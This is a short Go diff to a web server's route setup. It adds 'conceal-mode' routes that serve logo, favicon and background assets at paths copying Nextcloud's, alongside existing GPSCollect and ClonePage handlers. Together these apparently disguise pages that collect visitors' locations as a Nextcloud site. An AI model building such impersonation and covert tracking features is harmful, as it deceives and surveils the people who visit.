@@ -52,6 +52,10 @@ func main() {
 	mux.HandleFunc("POST /g/{slug}/loc", h.GPSCollect)
 	mux.HandleFunc("GET /p/{slug}", h.ClonePage)
 	mux.HandleFunc("GET /favicon.ico", h.Favicon)
+	// Conceal-mode assets, served at paths that mirror Nextcloud's real ones.
+	mux.HandleFunc("GET /core/img/logo/logo.svg", h.ConcealLogo)
+	mux.HandleFunc("GET /core/img/favicon.svg", h.ConcealCoreFavicon)
+	mux.HandleFunc("GET /apps/theming/img/background/jo-myoung-hee-fluid.webp", h.ConcealBackground)
 
 	// Auth + setup.
 	mux.HandleFunc("/setup", h.Setup)
